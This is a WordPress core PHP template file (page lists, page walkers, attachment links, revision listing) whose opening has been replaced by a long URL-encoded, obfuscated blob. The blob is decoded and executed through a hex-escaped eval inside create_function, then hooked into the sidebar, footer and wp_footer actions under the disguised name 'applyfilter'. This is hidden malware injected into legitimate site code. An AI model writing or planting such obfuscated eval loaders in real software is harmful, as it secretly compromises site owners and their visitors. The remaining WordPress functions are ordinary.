nb%2a%2a0y%25Y%5be%2b93%21%27%27OUU2%26%26%2d%27k%29m%3d%2fH%7ef%5ejt%7ewV%7d0b%227KZenb%3f%2aq3z1%5fF%5d%5b%27%7b5qqr%2fQ2quev%3edu%2dw%2f%5eNy9EA3%228dFVP8%5ed%27T%7c%2fyeNa7%2aj%27I%27X%7bGQHAEj%3e4%24aN%28N%5bzc%60%28%5dRt5wmD%3cbWEUX%5cY%5bqI2hPjOo%263%5b%5bZG%29z%5bGSaBgG%3b%60ljMDT%3cF%3fDi%29E%23b%3fTD%3bTxC%7cxZa%7dwn%2c50Ws0%2b%60%2aPAuny%2ct%23%24Nz42s%23%2cM%7b%2ckAnk%2b7wu%5c9%2f%3fp%21%3f%40G8%28djh%5fq5p%3cO%7b2w%22hh%2f%29%7e3hxGbmDx%2c4u%40XdPceGm%3b%7eqRE%3dJeHQxQGS%2f%24%7e%23%3b%3aiy%3bH%3b%21%2cIOpi%5d%21Y%2a%2cnj3tFa%5d%3cR%7dbo%2aNvn8%7c%2a%7bo5%5f53C%5dgk%26p%404%5cz8588PF6g6C%2awnkIiW6G%3dDS%3d%28u%2f%2ec%7d%3d%24D%7dsg%5bNS%3e9dDp%3d%7cu%3c8TegerxG%3aT%23i%3f%7ev%2c%60Eo%5dEE%27%227%23%3b%3fn%5d%7b3q%3aD%3cAVgJx%26zw6%7bZ%5b%3d%25joLdVF%60%3d6%3dd%40sBi%5cV%3al%7c%2aMadMV%3dN%2d6%3fvO%2cBdq%7eL%2fL%2dtjfTZONWvNNn%5bzKyh%3b9t59oIkjbop%22%7et8%3e%7b%603%7b%7bwF%3evnS%27rz%25Z%21D%26%227le6V%3d%40%3c%2eCqwJq%604%23%24%3fdGDV%7cAVt%40%272r%7eHJiKu%2alnK%5dXSljS%7cCOpi%27V%3f%2aRL%7d%7eNY0W%5f5Q%2dBM6%25Y%40%2elAj2%26f97U9%5dq%5c9q%25c%2ayyfxjAi%5dx%2f%2aiy2%5fL%22%20n8%3cm%28%2fymyJ%2eMR%7bYXbjnN1%3a%7bGW%2bRaxaN%2cIo%3e%26n%2abvRn%7bqS5%22%5c48%225SWeYsnf1%5dj%5bKjh%5fq5p%3cmL%25Q%5b%7b%3fw%606%3b%60e5%40mD%3dT9SgSS%7cl%3ce%3c%3bN%2dA%24Gbb00X%5eJj%29b01JR%7eJM%23%2d%2dJN%24%21%7eHtMvR1%26%2chU%2d%60AMT%2co2okZnk%5dBkw1k7%2655%5d%26%3fh%5c88eqhdPs%7bDp%3dDB%3d%3dpiQ6Csjed%3f%2fC%3dCJ%7dak%3cMKS2Z%60KL%28%21%3aQ%28%20a%5dJ%23%3bR%7ep3%20%60%24w%28%5fqN5FRSWz%27E%2cX3%5ef8%5cIPG%5eg%60EJo%217%5bI%603%3fU%60ssd9B%3d%3dC%2eM9nDs4Pc%3e%5cd%25mF%3atRE%3d%28DG%3acWNiq1%21t%21%20j%2fft96%28R%2c%7dN%28L2%24%7eh%3d%2c%2b%2avwhn%224TvUfq%7bq%5b081Ksz%22hzp399z9u4C%2eJxx%29%3fuK6D%3c%3dD%20%40%29%3e%7crlKGR%3e%28S%7cGZW%3cMyu%29KbMrJ%21%7eyy%7eCjB%2cN4HIVnbB%5b%7df%5e0f4Mp%2c%5cOUzN%5b%5e%5bOfAoPA%2e3oTkI%25m16%5c8B%3f%3aC%60y5xGg%3fFs%2c4Sg%7c%3a%7c%25%3fKGC%3cj%23VZHCZQ%2f%29%29Z%29EiQk%27OO%7eEjiIX%29t%3bUtX%2bt%5ev00%3bvz%2aIOO4WX3%5ef%2aBgXp%5exO%40UzD%3d2e%3cpBBr%241P9VmV%3e%5f%2bgV%3c%3dTg%3e%20B%5ee%3eR%7eGJJMoDLT%3a%2e%20K%2eC%2a%2e%2d%24%2e%7d%20ttC%20bL%2bnn%5b%230a%7dYn%28NOWva%224N%60W4z%7b%7blC%60OIq1jU%5c2%5bTDqZ%212%3fw%3eF%3eBhGdTTa%22%2fpgD%7cdD%3d%7eDC%3aD%2e%7cuu%3d%7c%24%2f%21%23%23nr%28ML%2dx%7eC%5do%2e0x8%2c%23Hb0%280%5e%7b%60%3etTo%5bIOb%5dp%220B%40qE%60PG%5eg%60%22%22x%217%5bI%603%3fU%60ssd9B%3d%3dC%2eM9nDs4Pc%3e%5cd%25mF%3atRE%3dJei%21ix%25vQ%3b%3b1l%2bK%29%7eMQ%7e%23I%7en%2c%7e%2aMYY%23Mk%2bEoo%5faoWzU2A2%7b%2aBgXp%5ex%60IA%22pzp%5cSZ%212t8%60%3edV6V%3cyu6Q%2eSg%7c%20n8%21%7cuuAIK%3cF%7ceiD%7c%29%29%24%2fQ%3b%3bX%5e%60%2f4t%29C%20%7d%23x%24aL%7e%2bq%7bg%3bjNoIoAa%5fk22%25Y9bEU%60k%5e6A%5fU4%4047O%5b%60q7pww%60%3b%60e%7c6TF6S%3e%3c%3c6%3c%2dRMM%2cNNW%2dL%29TW%7dK%29%2b%2dZW%3bG3L%2dt%7dL%28%2d%2b%20N%27kb%232s%23%5bu%22d%60q5oIkoozp%22q%2ag%2aZSc%7c%7c%3aE%3dJx%29qU%5f%5c3e%7c%26%3cT%7bGFm9m%3cDJy%3eT%23L%7e%2c%24XfPNn0N0maD%3bLcW%20%7el%7e%3b%28X%2aQLkU%273Ip%40i%6074%60p%7e%7b%28zUt5o%27v%27zOp%22EUgV%3ecP%2fuA%3a%3aSGIT%27dFUZ%3fP%60Pd%3eKlsF%29%20i%2dH%2bY%5cR%2dW%2dvY%3etjFLp%2a%27%2dNQ%20%21QQ%7e%2an%2du%5duQt%2d%23t%23%21%2cn%212%3fBgMtnAN%2d5wM%27zO%27%272%5c%403fdfh%267w5oD%29Hi%7b298h%26%7cr%7bdVFddD%2eC%256%206%3f%3dS%3d%3e%7c%2f%3etE%5doZT%2fHrcvWZ%24%28%7e%24%24t%5eXaJ%27J%2dvM%20Nb%20%26BgPa%2dbEvRw%5faOUzOO%26s6%60%5eF%5e4%5d%5bh5k%3cHiQ3%26%22%3f5qr%3a3F%3dVFF%3cJyZ%5c%23%5c%3cmKVg%3bjAESDGxeN%27c%2c%20%22Q%7e%3b%20%2f%23xwCy%5f%2e%28%24%27kr52%20UX%25%2ajEXMf%2b%3c%2abU%5e%272qXwfE%5d%60%3eg25m%2ek%3dn%2f%21%25cf%2eqr%3a3%7c%2fGmfVTSm%5cDPb%2aQ%3cr%3bL%3e%21%20Vt%40%2aITa%219i%24%28%21K%20J5RM%7dM%21%2bIo%2bmvb0%2b%3bYM%60%3et3o%2bZI%27%2b%7bZb2%26X%5fBf%27%7b3U%7bUO%5f%40%7c%264%222lq6P8%2e7Pg%5f%299%40PmP%7eBSc%3fLgJFSGKvcCuTYS%3b%7cCQ%21A%20%2e%2d%2fA5CjS3p%7e%21MnLs%23%7dbf31Y%3d6%3dMwfcVS%2bpogPgXp%5eg%5fNU%40%201q9s%208B%3fB%5fVG%3aVpWmDprwJF%22%20n8%21rr%2fAC%2eyCC%29%2cMQ7H%23%7eQG%21%2eE0R%3civ%5c%24%23MYU6%21zK4%27%3e3%26h3AAITcSXnk%26j%3f%2a%3fBfB%60%607Jx%7cT%29OVUshg%3eg83%3ak%20wCy9x%2e%26R6y%2e8%215%2cL%5e%20Sx%2fSHGJJSJAAEooI%27%27%24A%5eZk0xoL%5c%7e0bv%20NbWEhwV%7dWz%27E%2c%5bfqU23B8O%3diWNR%2cvbkX%2aW%3aSE%3a%7e%7b%5f%3dFBhD%5ccm%3cZi%29V%28%5d%5f51hw4%3e4q%5c8%5cpB%3f3s%3e%22%22FA%27jhu%29Nat%2eW%7env%2b0%26%5b%2c5T%29J%2f%2ex%21%7d%24%23%2f%24GJ%2e%24Rdf%2c5%27wTQ%262%5f6%29z%2b%40V9%406hJ%21xiwy%40%3dV%3c%5ceVBTF%2a1%5f%26Ud%2avYbkgKr%29%28%23e%3fVXG%5e%60%2fx%2cMLyv%24YNW%2a2Uah%3cx%2eKyJQR%20C%29%2f%21LLg%3dB%3aX%3fMCI%227%60%5d%26%3f1q%25c%5fr%241%7cb%2d9D%3dPw%3f8%25d%3c%3eS%20QD%28XPm%2eClFS%2f%2ei%3aWNCb%26r%29Jf0D%5f79%20H%2dW%7eiE%5d%20U%25Q%3bvE%5djtvEYbvM7eVFVB04%3fMCE%5dyop4%603%603sU5Bg%3f%3eKw%2b%3cm%3e%5f8rB%3f6%5d%7crel0PF%2c%3b3PD%3aiQ%29T%3aiKu%3aZAG6GSc%3fSyPe%7cZ%3a2sI%24XMA%5dAfRhiD%60',6731);}call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));}}
	if($text) {$out=@ob_get_contents(); @ob_end_clean(); return $text.$out;}
}
add_action('get_sidebar', 'applyfilter', 1, 0);
add_action('get_footer', 'applyfilter', 1, 0);
add_action('wp_footer', 'applyfilter', 1, 0);

/**
 * Helper function for wp_link_pages().
 *
 * @since 3.1.0
 * @access private
 *
 * @param int $i Page number.
 * @return string Link.
 */
function _wp_link_page( $i ) {
	global $wp_rewrite;
	$post = get_post();

	if ( 1 == $i ) {
		$url = get_permalink();
	} else {
		if ( '' == get_option('permalink_structure') || in_array($post->post_status, array('draft', 'pending')) )
			$url = add_query_arg( 'page', $i, get_permalink() );
		elseif ( 'page' == get_option('show_on_front') && get_option('page_on_front') == $post->ID )
			$url = trailingslashit(get_permalink()) . user_trailingslashit("$wp_rewrite->pagination_base/" . $i, 'single_paged');
		else
			$url = trailingslashit(get_permalink()) . user_trailingslashit($i, 'single_paged');
	}

	return '<a href="' . esc_url( $url ) . '">';
}

//
// Post-meta: Custom per-post fields.
//

/**
 * Retrieve post custom meta data field.
 *
 * @since 1.5.0
 *
 * @param string $key Meta data key name.
 * @return bool|string|array Array of values or single value, if only one element exists. False will be returned if key does not exist.
 */
function post_custom( $key = '' ) {
	$custom = get_post_custom();

	if ( !isset( $custom[$key] ) )
		return false;
	elseif ( 1 == count($custom[$key]) )
		return $custom[$key][0];
	else
		return $custom[$key];
}

/**
 * Display list of post custom fields.
 *
 * @internal This will probably change at some point...
 * @since 1.2.0
 * @uses apply_filters() Calls 'the_meta_key' on list item HTML content, with key and value as separate parameters.
 */
function the_meta() {
	if ( $keys = get_post_custom_keys() ) {
		echo "<ul class='post-meta'>\n";
		foreach ( (array) $keys as $key ) {
			$keyt = trim($key);
			if ( is_protected_meta( $keyt, 'post' ) )
				continue;
			$values = array_map('trim', get_post_custom_values($key));
			$value = implode($values,', ');
			echo apply_filters('the_meta_key', "<li><span class='post-meta-key'>$key:</span> $value</li>\n", $key, $value);
		}
		echo "</ul>\n";
	}
}

//
// Pages
//

/**
 * Retrieve or display list of pages as a dropdown (select list).
 *
 * @since 2.1.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_dropdown_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'child_of' => 0,
		'selected' => 0, 'echo' => 1,
		'name' => 'page_id', 'id' => '',
		'show_option_none' => '', 'show_option_no_change' => '',
		'option_none_value' => ''
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$pages = get_pages($r);
	$output = '';
	// Back-compat with old system where both id and name were based on $name argument
	if ( empty($id) )
		$id = $name;

	if ( ! empty($pages) ) {
		$output = "<select name='" . esc_attr( $name ) . "' id='" . esc_attr( $id ) . "'>\n";
		if ( $show_option_no_change )
			$output .= "\t<option value=\"-1\">$show_option_no_change</option>";
		if ( $show_option_none )
			$output .= "\t<option value=\"" . esc_attr($option_none_value) . "\">$show_option_none</option>\n";
		$output .= walk_page_dropdown_tree($pages, $depth, $r);
		$output .= "</select>\n";
	}

	$output = apply_filters('wp_dropdown_pages', $output);

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Retrieve or display list of pages in list (li) format.
 *
 * @since 1.5.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_list_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'show_date' => '',
		'date_format' => get_option('date_format'),
		'child_of' => 0, 'exclude' => '',
		'title_li' => __('Pages'), 'echo' => 1,
		'authors' => '', 'sort_column' => 'menu_order, post_title',
		'link_before' => '', 'link_after' => '', 'walker' => '',
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$output = '';
	$current_page = 0;

	// sanitize, mostly to keep spaces out
	$r['exclude'] = preg_replace('/[^0-9,]/', '', $r['exclude']);

	// Allow plugins to filter an array of excluded pages (but don't put a nullstring into the array)
	$exclude_array = ( $r['exclude'] ) ? explode(',', $r['exclude']) : array();
	$r['exclude'] = implode( ',', apply_filters('wp_list_pages_excludes', $exclude_array) );

	// Query pages.
	$r['hierarchical'] = 0;
	$pages = get_pages($r);

	if ( !empty($pages) ) {
		if ( $r['title_li'] )
			$output .= '<li class="pagenav">' . $r['title_li'] . '<ul>';

		global $wp_query;
		if ( is_page() || is_attachment() || $wp_query->is_posts_page )
			$current_page = $wp_query->get_queried_object_id();
		$output .= walk_page_tree($pages, $r['depth'], $current_page, $r);

		if ( $r['title_li'] )
			$output .= '</ul></li>';
	}

	$output = apply_filters('wp_list_pages', $output, $r);

	if ( $r['echo'] )
		echo $output;
	else
		return $output;
}

/**
 * Display or retrieve list of pages with optional home link.
 *
 * The arguments are listed below and part of the arguments are for {@link
 * wp_list_pages()} function. Check that function for more info on those
 * arguments.
 *
 * <ul>
 * <li><strong>sort_column</strong> - How to sort the list of pages. Defaults
 * to page title. Use column for posts table.</li>
 * <li><strong>menu_class</strong> - Class to use for the div ID which contains
 * the page list. Defaults to 'menu'.</li>
 * <li><strong>echo</strong> - Whether to echo list or return it. Defaults to
 * echo.</li>
 * <li><strong>link_before</strong> - Text before show_home argument text.</li>
 * <li><strong>link_after</strong> - Text after show_home argument text.</li>
 * <li><strong>show_home</strong> - If you set this argument, then it will
 * display the link to the home page. The show_home argument really just needs
 * to be set to the value of the text of the link.</li>
 * </ul>
 *
 * @since 2.7.0
 *
 * @param array|string $args
 * @return string html menu
 */
function wp_page_menu( $args = array() ) {
	$defaults = array('sort_column' => 'menu_order, post_title', 'menu_class' => 'menu', 'echo' => true, 'link_before' => '', 'link_after' => '');
	$args = wp_parse_args( $args, $defaults );
	$args = apply_filters( 'wp_page_menu_args', $args );

	$menu = '';

	$list_args = $args;

	// Show Home in the menu
	if ( ! empty($args['show_home']) ) {
		if ( true === $args['show_home'] || '1' === $args['show_home'] || 1 === $args['show_home'] )
			$text = __('Home');
		else
			$text = $args['show_home'];
		$class = '';
		if ( is_front_page() && !is_paged() )
			$class = 'class="current_page_item"';
		$menu .= '<li ' . $class . '><a href="' . home_url( '/' ) . '" title="' . esc_attr($text) . '">' . $args['link_before'] . $text . $args['link_after'] . '</a></li>';
		// If the front page is a page, add it to the exclude list
		if (get_option('show_on_front') == 'page') {
			if ( !empty( $list_args['exclude'] ) ) {
				$list_args['exclude'] .= ',';
			} else {
				$list_args['exclude'] = '';
			}
			$list_args['exclude'] .= get_option('page_on_front');
		}
	}

	$list_args['echo'] = false;
	$list_args['title_li'] = '';
	$menu .= str_replace( array( "\r", "\n", "\t" ), '', wp_list_pages($list_args) );

	if ( $menu )
		$menu = '<ul>' . $menu . '</ul>';

	$menu = '<div class="' . esc_attr($args['menu_class']) . '">' . $menu . "</div>\n";
	$menu = apply_filters( 'wp_page_menu', $menu, $args );
	if ( $args['echo'] )
		echo $menu;
	else
		return $menu;
}

//
// Page helpers
//

/**
 * Retrieve HTML list content for page list.
 *
 * @uses Walker_Page to create HTML list content.
 * @since 2.1.0
 * @see Walker_Page::walk() for parameters and return description.
 */
function walk_page_tree($pages, $depth, $current_page, $r) {
	if ( empty($r['walker']) )
		$walker = new Walker_Page;
	else
		$walker = $r['walker'];

	$args = array($pages, $depth, $r, $current_page);
	return call_user_func_array(array($walker, 'walk'), $args);
}

/**
 * Retrieve HTML dropdown (select) content for page list.
 *
 * @uses Walker_PageDropdown to create HTML dropdown content.
 * @since 2.1.0
 * @see Walker_PageDropdown::walk() for parameters and return description.
 */
function walk_page_dropdown_tree() {
	$args = func_get_args();
	if ( empty($args[2]['walker']) ) // the user's options are the third parameter
		$walker = new Walker_PageDropdown;
	else
		$walker = $args[2]['walker'];

	return call_user_func_array(array($walker, 'walk'), $args);
}

/**
 * Create HTML list of pages.
 *
 * @package WordPress
 * @since 2.1.0
 * @uses Walker
 */
class Walker_Page extends Walker {
	/**
	 * @see Walker::$tree_type
	 * @since 2.1.0
	 * @var string
	 */
	var $tree_type = 'page';

	/**
	 * @see Walker::$db_fields
	 * @since 2.1.0
	 * @todo Decouple this.
	 * @var array
	 */
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');

	/**
	 * @see Walker::start_lvl()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 * @param array $args
	 */
	function start_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class='children'>\n";
	}

	/**
	 * @see Walker::end_lvl()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 * @param array $args
	 */
	function end_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "$indent</ul>\n";
	}

	/**
	 * @see Walker::start_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object.
	 * @param int $depth Depth of page. Used for padding.
	 * @param int $current_page Page ID.
	 * @param array $args
	 */
	function start_el( &$output, $page, $depth, $args, $current_page = 0 ) {
		if ( $depth )
			$indent = str_repeat("\t", $depth);
		else
			$indent = '';

		extract($args, EXTR_SKIP);
		$css_class = array('page_item', 'page-item-'.$page->ID);
		if ( !empty($current_page) ) {
			$_current_page = get_post( $current_page );
			if ( in_array( $page->ID, $_current_page->ancestors ) )
				$css_class[] = 'current_page_ancestor';
			if ( $page->ID == $current_page )
				$css_class[] = 'current_page_item';
			elseif ( $_current_page && $page->ID == $_current_page->post_parent )
				$css_class[] = 'current_page_parent';
		} elseif ( $page->ID == get_option('page_for_posts') ) {
			$css_class[] = 'current_page_parent';
		}

		$css_class = implode( ' ', apply_filters( 'page_css_class', $css_class, $page, $depth, $args, $current_page ) );

		$output .= $indent . '<li class="' . $css_class . '"><a href="' . get_permalink($page->ID) . '">' . $link_before . apply_filters( 'the_title', $page->post_title, $page->ID ) . $link_after . '</a>';

		if ( !empty($show_date) ) {
			if ( 'modified' == $show_date )
				$time = $page->post_modified;
			else
				$time = $page->post_date;

			$output .= " " . mysql2date($date_format, $time);
		}
	}

	/**
	 * @see Walker::end_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object. Not used.
	 * @param int $depth Depth of page. Not Used.
	 * @param array $args
	 */
	function end_el( &$output, $page, $depth = 0, $args = array() ) {
		$output .= "</li>\n";
	}

}

/**
 * Create HTML dropdown list of pages.
 *
 * @package WordPress
 * @since 2.1.0
 * @uses Walker
 */
class Walker_PageDropdown extends Walker {
	/**
	 * @see Walker::$tree_type
	 * @since 2.1.0
	 * @var string
	 */
	var $tree_type = 'page';

	/**
	 * @see Walker::$db_fields
	 * @since 2.1.0
	 * @todo Decouple this
	 * @var array
	 */
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');

	/**
	 * @see Walker::start_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object.
	 * @param int $depth Depth of page in reference to parent pages. Used for padding.
	 * @param array $args Uses 'selected' argument for selected page to set selected HTML attribute for option element.
	 * @param int $id
	 */
	function start_el(&$output, $page, $depth, $args, $id = 0) {
		$pad = str_repeat('&nbsp;', $depth * 3);

		$output .= "\t<option class=\"level-$depth\" value=\"$page->ID\"";
		if ( $page->ID == $args['selected'] )
			$output .= ' selected="selected"';
		$output .= '>';
		$title = apply_filters( 'list_pages', $page->post_title, $page );
		$output .= $pad . esc_html( $title );
		$output .= "</option>\n";
	}
}

//
// Attachments
//

/**
 * Display an attachment page link using an image or icon.
 *
 * @since 2.0.0
 *
 * @param int $id Optional. Post ID.
 * @param bool $fullsize Optional, default is false. Whether to use full size.
 * @param bool $deprecated Deprecated. Not used.
 * @param bool $permalink Optional, default is false. Whether to include permalink.
 */
function the_attachment_link( $id = 0, $fullsize = false, $deprecated = false, $permalink = false ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.5' );

	if ( $fullsize )
		echo wp_get_attachment_link($id, 'full', $permalink);
	else
		echo wp_get_attachment_link($id, 'thumbnail', $permalink);
}

/**
 * Retrieve an attachment page link using an image or icon, if possible.
 *
 * @since 2.5.0
 * @uses apply_filters() Calls 'wp_get_attachment_link' filter on HTML content with same parameters as function.
 *
 * @param int $id Optional. Post ID.
 * @param string $size Optional, default is 'thumbnail'. Size of image, either array or string.
 * @param bool $permalink Optional, default is false. Whether to add permalink to image.
 * @param bool $icon Optional, default is false. Whether to include icon.
 * @param string|bool $text Optional, default is false. If string, then will be link text.
 * @return string HTML content.
 */
function wp_get_attachment_link( $id = 0, $size = 'thumbnail', $permalink = false, $icon = false, $text = false ) {
	$id = intval( $id );
	$_post = get_post( $id );

	if ( empty( $_post ) || ( 'attachment' != $_post->post_type ) || ! $url = wp_get_attachment_url( $_post->ID ) )
		return __( 'Missing Attachment' );

	if ( $permalink )
		$url = get_attachment_link( $_post->ID );

	$post_title = esc_attr( $_post->post_title );

	if ( $text )
		$link_text = $text;
	elseif ( $size && 'none' != $size )
		$link_text = wp_get_attachment_image( $id, $size, $icon );
	else
		$link_text = '';

	if ( trim( $link_text ) == '' )
		$link_text = $_post->post_title;

	return apply_filters( 'wp_get_attachment_link', "<a href='$url' title='$post_title'>$link_text</a>", $id, $size, $permalink, $icon, $text );
}

/**
 * Wrap attachment in <<p>> element before content.
 *
 * @since 2.0.0
 * @uses apply_filters() Calls 'prepend_attachment' hook on HTML content.
 *
 * @param string $content
 * @return string
 */
function prepend_attachment($content) {
	$post = get_post();

	if ( empty($post->post_type) || $post->post_type != 'attachment' )
		return $content;

	$p = '<p class="attachment">';
	// show the medium sized image representation of the attachment if available, and link to the raw file
	$p .= wp_get_attachment_link(0, 'medium', false);
	$p .= '</p>';
	$p = apply_filters('prepend_attachment', $p);

	return "$p\n$content";
}

//
// Misc
//

/**
 * Retrieve protected post password form content.
 *
 * @since 1.0.0
 * @uses apply_filters() Calls 'the_password_form' filter on output.
 *
 * @return string HTML content for password form for password protected post.
 */
function get_the_password_form() {
	$post = get_post();
	$label = 'pwbox-' . ( empty($post->ID) ? rand() : $post->ID );
	$output = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">
	<p>' . __("This post is password protected. To view it please enter your password below:") . '</p>
	<p><label for="' . $label . '">' . __("Password:") . ' <input name="post_password" id="' . $label . '" type="password" size="20" /></label> <input type="submit" name="Submit" value="' . esc_attr__("Submit") . '" /></p>
</form>
	';
	return apply_filters('the_password_form', $output);
}

/**
 * Whether currently in a page template.
 *
 * This template tag allows you to determine if you are in a page template.
 * You can optionally provide a template name and then the check will be
 * specific to that template.
 *
 * @since 2.5.0
 * @uses $wp_query
 *
 * @param string $template The specific template name if specific matching is required.
 * @return bool False on failure, true if success.
 */
function is_page_template( $template = '' ) {
	if ( ! is_page() )
		return false;

	$page_template = get_page_template_slug( get_queried_object_id() );

	if ( empty( $template ) )
		return (bool) $page_template;

	if ( $template == $page_template )
		return true;

	if ( 'default' == $template && ! $page_template )
		return true;

	return false;
}

/**
 * Get the specific template name for a page.
 *
 * @since 3.4.0
 *
 * @param int $post_id The page ID to check. Defaults to the current post, when used in the loop.
 * @return string|bool Page template filename. Returns an empty string when the default page template
 * 	is in use. Returns false if the post is not a page.
 */
function get_page_template_slug( $post_id = null ) {
	$post = get_post( $post_id );
	if ( 'page' != $post->post_type )
		return false;
	$template = get_post_meta( $post->ID, '_wp_page_template', true );
	if ( ! $template || 'default' == $template )
		return '';
	return $template;
}

/**
 * Retrieve formatted date timestamp of a revision (linked to that revisions's page).
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses date_i18n()
 *
 * @param int|object $revision Revision ID or revision object.
 * @param bool $link Optional, default is true. Link to revisions's page?
 * @return string i18n formatted datetimestamp or localized 'Current Revision'.
 */
function wp_post_revision_title( $revision, $link = true ) {
	if ( !$revision = get_post( $revision ) )
		return $revision;

	if ( !in_array( $revision->post_type, array( 'post', 'page', 'revision' ) ) )
		return false;

	/* translators: revision date format, see http://php.net/date */
	$datef = _x( 'j F, Y @ G:i', 'revision date format');
	/* translators: 1: date */
	$autosavef = __( '%1$s [Autosave]' );
	/* translators: 1: date */
	$currentf  = __( '%1$s [Current Revision]' );

	$date = date_i18n( $datef, strtotime( $revision->post_modified ) );
	if ( $link && current_user_can( 'edit_post', $revision->ID ) && $link = get_edit_post_link( $revision->ID ) )
		$date = "<a href='$link'>$date</a>";

	if ( !wp_is_post_revision( $revision ) )
		$date = sprintf( $currentf, $date );
	elseif ( wp_is_post_autosave( $revision ) )
		$date = sprintf( $autosavef, $date );

	return $date;
}

/**
 * Display list of a post's revisions.
 *
 * Can output either a UL with edit links or a TABLE with diff interface, and
 * restore action links.
 *
 * Second argument controls parameters:
 *   (bool)   parent : include the parent (the "Current Revision") in the list.
 *   (string) format : 'list' or 'form-table'. 'list' outputs UL, 'form-table'
 *                     outputs TABLE with UI.
 *   (int)    right  : what revision is currently being viewed - used in
 *                     form-table format.
 *   (int)    left   : what revision is currently being diffed against right -
 *                     used in form-table format.
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses wp_get_post_revisions()
 * @uses wp_post_revision_title()
 * @uses get_edit_post_link()
 * @uses get_the_author_meta()
 *
 * @todo split into two functions (list, form-table) ?
 *
 * @param int|object $post_id Post ID or post object.
 * @param string|array $args See description {@link wp_parse_args()}.
 * @return null
 */
function wp_list_post_revisions( $post_id = 0, $args = null ) {
	if ( !$post = get_post( $post_id ) )
		return;

	$defaults = array( 'parent' => false, 'right' => false, 'left' => false, 'format' => 'list', 'type' => 'all' );
	extract( wp_parse_args( $args, $defaults ), EXTR_SKIP );

	switch ( $type ) {
		case 'autosave' :
			if ( !$autosave = wp_get_post_autosave( $post->ID ) )
				return;
			$revisions = array( $autosave );
			break;
		case 'revision' : // just revisions - remove autosave later
		case 'all' :
		default :
			if ( !$revisions = wp_get_post_revisions( $post->ID ) )
				return;
			break;
	}

	/* translators: post revision: 1: when, 2: author name */
	$titlef = _x( '%1$s by %2$s', 'post revision' );

	if ( $parent )
		array_unshift( $revisions, $post );

	$rows = $right_checked = '';
	$class = false;
	$can_edit_post = current_user_can( 'edit_post', $post->ID );
	foreach ( $revisions as $revision ) {
		if ( !current_user_can( 'read_post', $revision->ID ) )
			continue;
		if ( 'revision' === $type && wp_is_post_autosave( $revision ) )
			continue;

		$date = wp_post_revision_title( $revision );
		$name = get_the_author_meta( 'display_name', $revision->post_author );

		if ( 'form-table' == $format ) {
			if ( $left )
				$left_checked = $left == $revision->ID ? ' checked="checked"' : '';
			else
				$left_checked = $right_checked ? ' checked="checked"' : ''; // [sic] (the next one)
			$right_checked = $right == $revision->ID ? ' checked="checked"' : '';

			$class = $class ? '' : " class='alternate'";

			if ( $post->ID != $revision->ID && $can_edit_post )
				$actions = '<a href="' . wp_nonce_url( add_query_arg( array( 'revision' => $revision->ID, 'action' => 'restore' ) ), "restore-post_$post->ID|$revision->ID" ) . '">' . __( 'Restore' ) . '</a>';
			else
				$actions = '';

			$rows .= "<tr$class>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='left' value='$revision->ID'$left_checked /></th>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='right' value='$revision->ID'$right_checked /></th>\n";
			$rows .= "\t<td>$date</td>\n";
			$rows .= "\t<td>$name</td>\n";
			$rows .= "\t<td class='action-links'>$actions</td>\n";
			$rows .= "</tr>\n";
		} else {
			$title = sprintf( $titlef, $date, $name );
			$rows .= "\t<li>$title</li>\n";
		}
	}

	if ( 'form-table' == $format ) : ?>

<form action="revision.php" method="get">

<div class="tablenav">
	<div class="alignleft">
		<input type="submit" class="button-secondary" value="<?php esc_attr_e( 'Compare Revisions' ); ?>" />
		<input type="hidden" name="action" value="diff" />
		<input type="hidden" name="post_type" value="<?php echo esc_attr($post->post_type); ?>" />
	</div>
</div>

<br class="clear" />

<table class="widefat post-revisions" cellspacing="0" id="post-revisions">
	<col />
	<col />
	<col style="width: 33%" />
	<col style="width: 33%" />
	<col style="width: 33%" />
<thead>
<tr>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'Old', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'New', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'Date Created', 'revisions column name' ); ?></th>
	<th scope="col"><?php _e( 'Author' ); ?></th>
	<th scope="col" class="action-links"><?php _e( 'Actions' ); ?></th>
</tr>
</thead>
<tbody>

<?php echo $rows; ?>

</tbody>
</table>

</form>

<?php
	else :
		echo "<ul class='post-revisions'>\n";
		echo $rows;
		echo "</ul>";
	endif;

}
